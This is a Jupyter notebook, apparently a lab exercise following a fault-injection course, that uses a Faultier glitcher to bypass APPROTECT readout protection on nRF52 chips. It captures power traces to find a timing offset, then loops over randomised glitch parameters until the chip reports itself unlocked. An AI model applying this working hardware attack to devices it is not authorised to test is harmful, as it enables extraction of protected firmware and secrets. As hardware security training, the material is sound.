In [ ]:
"""

Sources:

Hextree.io Course: https://app.hextree.io/courses/fault-injection-nrf52-approtect
LimitedResearch blog: https://limitedresults.com/results/nrf52-debug-resurrection-approtect-bypass

"""

In [ ]:
import faultier
import plotly.graph_objects as go

ft = faultier.Faultier()

def capture(adc_samples=6000, power_cycle_length=300000):
    ft.configure_adc(faultier.ADC_CROWBAR, adc_samples)
    ft.configure_glitcher(
        power_cycle_output=faultier.OUT_MUX0,
        power_cycle_length=power_cycle_length,
    )
    ft.glitch()
    return ft.read_adc()


def plot_adc(values, title="Faultier ADC capture"):
    fig = go.Figure(go.Scatter(y=values, mode="lines", name="ADC"))
    fig.update_layout(
        title=title,
        xaxis_title="sample",
        yaxis_title="ADC value",
        height=450,
        margin=dict(l=50, r=20, t=50, b=40),
    )
    fig.update_xaxes(rangeslider_visible=True)  # drag handles to zoom
    fig.show(config={"scrollZoom": True})       # mouse wheel zoom


values = capture()
plot_adc(values)


In [4]:
# 1 measure of PRi Pico ADC takes 96 CPU cycles, so to calculate delya, we need to mul it by 96.
# 2635 * 96 = delay
# Change 2635 to your value from plot above.
# After measures done, press RESET button on your Faultier and run next cell (in case when you can't reopen fultier with faultier.Faultier()). 

In [ ]:
import faultier
import random

ft = faultier.Faultier()
ft.configure_glitcher(
    glitch_output = faultier.OUT_CROWBAR,
    power_cycle_output = faultier.OUT_MUX0,
    power_cycle_length = 300000
)

delay = 2635 # Change it to your value!
delay_start = (delay - 100) * 96
delay_end = (delay + 100) * 96

while True:
    d = random.randint(delay_start, delay_end)
    p = random.randint(8, 60)
    #print(f"[*] Delay: {d} Pulse: {p}")
    ft.glitch(delay = d, pulse = p)
    if(ft.nrf52_check()):
        print(f"[+] Success! Delay: {d} Pulse: {p}")
        print("[*] Chip unlocked!")
        break